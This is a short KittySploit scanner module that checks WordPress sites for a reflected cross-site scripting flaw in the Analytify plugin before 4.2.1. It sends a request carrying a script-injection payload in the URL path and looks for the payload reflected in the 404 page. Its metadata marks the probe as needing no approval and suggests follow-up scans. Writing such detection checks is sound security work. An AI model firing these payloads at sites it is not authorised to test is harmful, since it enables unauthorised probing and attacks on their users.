#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WordPress Analytify 4."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Analytify <4.2.1 - Cross-Site Scripting Detection',
        'description': 'WordPress Analytify 4.2.1 does not escape the current URL before outputting it back in a 404 page when the 404 tracking feature is enabled, leading to reflected cross-site scripting.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'vulnerability', 'wp', 'wordpress', 'analytify', 'wpscan', 'wp-plugin', 'xss', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': ['https://wpscan.com/vulnerability/b8415ed5-6fd0-42fe-9201-73686c1871c5'],
    }

    def run(self):
        r = self.http_request(method="GET", path='/aa404bb?a</script><script>alert(/XSS/)</script>', allow_redirects=False)
        if not r or r.status_code != 404:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('text/javascript">alert(/XSS/)</script>', 'wp-analytify',)
        header_any = ('text/html',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='medium',
                reason="Analytify <4.2.1 - Cross-Site Scripting detected",
                path='/aa404bb?a</script><script>alert(/XSS/)</script>',
            )
            return True
        return False

